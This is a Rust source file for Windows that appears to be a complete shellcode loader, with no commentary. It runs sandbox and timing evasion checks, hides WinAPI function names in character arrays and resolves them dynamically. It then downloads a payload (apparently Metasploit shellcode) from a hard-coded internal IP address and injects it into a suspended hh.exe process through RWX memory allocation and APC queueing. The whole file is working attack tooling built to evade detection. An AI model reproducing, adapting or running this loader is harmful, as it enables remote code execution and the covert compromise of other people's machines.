extern crate winapi;
use reqwest;
use std::ffi::CString;
use std::ptr::{null, null_mut};
use std::process::exit;
use std::thread::sleep;
use std::time::Duration;
use std::vec::Vec;
use std::time::SystemTime;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{BOOL, DWORD, LPVOID, LPCVOID, FALSE};
use winapi::shared::ntdef::HANDLE;
use winapi::um::libloaderapi::*;
use winapi::um::minwinbase::*;
use winapi::um::processthreadsapi::*;
use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
use winapi::um::winbase::CREATE_SUSPENDED; 
use winapi::shared::basetsd::ULONG_PTR;
use winapi::um::winnt::*;

unsafe fn allocate_and_randomize(size: SIZE_T) -> LPVOID {
    let mut buffer: Vec<u8> = vec![0; size as usize];

    let elapsed = SystemTime::now().elapsed().unwrap();
    let random_value = (elapsed.as_millis() % 0xFF) as u8;
    buffer[0] = random_value;

    buffer.as_mut_ptr() as LPVOID
}

unsafe fn enhanced_anti_debugging() {
    let p_address = allocate_and_randomize(0x100);

    if !p_address.is_null() && *(p_address as *mut u8) > 128 {
        for _ in 0..3 {
            let _value: ULONG_PTR = GetCurrentThreadId() as ULONG_PTR;
            sleep(Duration::from_millis(1)); 
        }

    } else {
        sleep(Duration::from_millis(10));
    }
}

fn load_function(module: &str, proc_name: &str) -> *const () {
    let module_cstr = CString::new(module).unwrap();
    let proc_name_cstr = CString::new(proc_name).unwrap();

    unsafe {
        let module_handle = GetModuleHandleA(module_cstr.as_ptr());
        if module_handle.is_null() {
            exit(1)
        }

        let proc_address = GetProcAddress(module_handle, proc_name_cstr.as_ptr());
        if proc_address.is_null() {
            exit(1)
        }

        proc_address as *const ()
    }
}

type WriteProcessMemoryFunc = unsafe extern "system" fn(HANDLE, LPVOID, LPCVOID, SIZE_T, *mut SIZE_T) -> BOOL;
type CreateProcessAFunc = unsafe extern "system" fn(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION) -> BOOL;
type VirtualAllocExFunc = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
type QueueUserAPCFunc = unsafe extern "system" fn(PAPCFUNC, HANDLE, ULONG_PTR) -> BOOL;

fn get_payload_from_url(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut payload = Vec::new();
    let mut response = reqwest::blocking::get(url)?;
    response.copy_to(&mut payload)?;
    Ok(payload)
}

fn evade() {
    let start = std::time::Instant::now();
    sleep(Duration::from_millis(2000));
    let elapsed = start.elapsed();

    if elapsed.as_secs_f64() < 1.5 {
        exit(1);
    }

    unsafe {
        enhanced_anti_debugging();
    }

    let mut statex: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    statex.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;

    unsafe {
        GlobalMemoryStatusEx(&mut statex);
    }

    let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
    if total_memory_in_gb <= 1 {
        exit(1);
    }
}

fn main() {
    evade();

    let create_process_a: [char; 14] = ['C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A'];
    let create_process_a_str: String = create_process_a.iter().collect();

    let virtual_alloc_ex: [char; 14] = ['V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x'];
    let virtual_alloc_ex_str: String = virtual_alloc_ex.iter().collect();

    let procmem: [char; 18] = ['W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y'];
    let procmem_str: String = procmem.iter().collect();

    let queue_user_apc: [char; 12] = ['Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C'];
    let queue_user_apc_str: String = queue_user_apc.iter().collect();


    let pw_create_process: CreateProcessAFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &create_process_a_str)) };
    let pw_virtual_alloc_ex: VirtualAllocExFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &virtual_alloc_ex_str)) };
    let pw_procmem: WriteProcessMemoryFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &procmem_str)) };
    let pw_queue_user_apc: QueueUserAPCFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &queue_user_apc_str)) };

    let url = "http://10.0.0.226/msf.bin";
    let payload = match get_payload_from_url(url) {
        Ok(data) => data,
        Err(_e) => {
            exit(1);
        }
    };

    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let target_process = CString::new("C:\\Windows\\hh.exe").unwrap();

    unsafe {
        let success = pw_create_process(target_process.as_ptr(),null_mut(),null_mut(),null_mut(),FALSE,CREATE_SUSPENDED,null_mut(),null(),&mut si,&mut pi,);

        if success == 0 {
            exit(1);
        }

        let alloc_size = ((payload.len() + 4095) / 4096) * 4096;
        let shell_address = pw_virtual_alloc_ex(pi.hProcess, null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if shell_address.is_null() {
            exit(1);
        }

        let mut bytes_written = 0;
        let write_result = pw_procmem(pi.hProcess, shell_address, payload.as_ptr() as *const _, payload.len(), &mut bytes_written);
        if write_result == 0 {
            exit(1);
        }

        let apc_routine = std::mem::transmute(shell_address);
        let apc_result = pw_queue_user_apc(apc_routine, pi.hThread, 0);
        if apc_result == 0 {
            exit(1);
        }

        evade();

        ResumeThread(pi.hThread);

        let _skill = 0;
    }
}
